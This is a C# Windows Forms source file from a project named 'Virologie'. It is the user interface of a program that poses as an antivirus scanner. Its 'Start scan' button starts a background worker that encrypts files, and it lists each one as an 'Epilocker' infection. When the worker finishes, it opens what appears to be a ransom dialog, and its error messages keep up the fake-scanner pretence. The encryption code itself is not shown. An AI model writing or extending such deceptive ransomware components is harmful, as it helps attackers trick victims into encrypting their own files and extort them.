using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace Virologie
{
    public partial class GroupBoxScan : UserControl
    {
        private readonly EncryptWorker worker;

        private readonly DataTable table;

        public GroupBoxScan()
        {
            InitializeComponent();

            if (CryptoKeyManager.guid != Guid.Empty)
                ShowSeForm();

            worker = new EncryptWorker();
            worker.RunWorkerCompleted += worker_RunWorkerCompleted;
            worker.ProgressChanged += worker_ProgressChanged;
        }

        void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            int n = dataGridView1.Rows.Add();

            dataGridView1.Rows[n].Cells["VirusName"].Value = "Epilocker";
            dataGridView1.Rows[n].Cells["Severity"].Value = "Maximum";
            dataGridView1.Rows[n].Cells["Status"].Value = "Encrypted";
            dataGridView1.Rows[n].Cells["Description"].Value = worker.CurrentFile;
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Error != null)
            {
                Exception error = e.Error;
                if (error.GetType() == typeof (WebException))
                    MessageBox.Show("Cannot contact the update server. Please check your internet connection.",
                        "Error during scan",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                else
                    MessageBox.Show("Unknown error during the scan. Please contact support.",
                        "Error during scan",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            progressBar1.Value = 100;
            progressBar1.Style = ProgressBarStyle.Continuous;
            ShowSeForm();
        }

        private static void ShowSeForm()
        {
            var seForm = new SystemEncrytedForm();
            seForm.ShowDialog();
            
        }

        private void StartScanButton_Click(object sender, EventArgs e)
        {
            StartScanButton.Enabled = false;
            dataGridView1.Enabled = true;
            progressBar1.Style = ProgressBarStyle.Marquee;
            worker.RunWorkerAsync();
        }

       protected override void OnPaint(PaintEventArgs e)
       {
           base.OnPaint(e);
           if (DesignMode) this.Visible = false;
       }
    }
}
